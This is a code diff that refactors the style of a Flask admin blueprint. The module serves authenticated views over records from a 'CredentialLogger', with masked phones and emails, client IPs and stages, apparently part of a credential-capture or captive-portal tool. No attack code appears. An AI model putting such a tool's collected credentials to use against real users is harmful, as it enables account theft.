@@ -10,13 +10,12 @@ etc., but they MUST use the same decorator — there is no "open" admin path.
 from __future__ import annotations
 
 import logging
-from typing import Optional
 
 from flask import Blueprint, jsonify
 
-from utils.logger import CredentialLogger
 from core.events import EventBus
 from portal.security import admin_required
+from utils.logger import CredentialLogger
 
 logger = logging.getLogger("wimirage")
 
@@ -31,7 +30,7 @@ ADMIN_AUTH_RATE_LIMIT = 10
 
 def build_admin_blueprint(
     cred_logger: CredentialLogger,
-    event_bus: Optional[EventBus] = None,
+    event_bus: EventBus | None = None,
 ) -> Blueprint:
     """Return a Flask Blueprint exposing authenticated admin views.
 
@@ -70,18 +69,14 @@ def build_admin_blueprint(
             }
             for c in cred_logger.get_all()
         ]
-        return jsonify(
-            {"count": len(records), "records": records}
-        )
+        return jsonify({"count": len(records), "records": records})
 
     @bp.route("/status")
     @rate_limit(max_requests=ADMIN_AUTH_RATE_LIMIT, window_seconds=60)
     @admin_required
     def status():
         bus_alive = event_bus.is_alive() if event_bus else False
-        return jsonify(
-            {"ok": True, "event_bus_alive": bus_alive}
-        )
+        return jsonify({"ok": True, "event_bus_alive": bus_alive})
 
     @bp.route("/audit")
     @rate_limit(max_requests=ADMIN_AUTH_RATE_LIMIT, window_seconds=60)
@@ -90,17 +85,17 @@ def build_admin_blueprint(
         # Operator-facing audit log tail. We don't surface token contents;
         # just the last 50 access records.
         from portal.security import scrub_for_log  # local to keep imports tight
+
         tail = getattr(cred_logger, "credentials", [])
         lines = [
-            scrub_for_log(f"{c.timestamp} ip={c.client_ip} stage={c.stage}")
-            for c in tail[-50:]
+            scrub_for_log(f"{c.timestamp} ip={c.client_ip} stage={c.stage}") for c in tail[-50:]
         ]
         return jsonify({"lines": lines})
 
     return bp
 
 
-def _mask_phone(phone: Optional[str]) -> str:
+def _mask_phone(phone: str | None) -> str:
     """Return ``+91*****1234``-style mask; empty input passes through.
 
     Rule: keep the first 3 && last 4 characters visible, mask everything
@@ -121,7 +116,7 @@ def _mask_phone(phone: Optional[str]) -> str:
     return f"{head}{middle}{tail}"
 
 
-def _mask_email(email: Optional[str]) -> str:
+def _mask_email(email: str | None) -> str:
     """Return ``a***@example.com``-style mask; empty input passes through.
 
     Rule: keep the first character, mask the rest of the local-part with
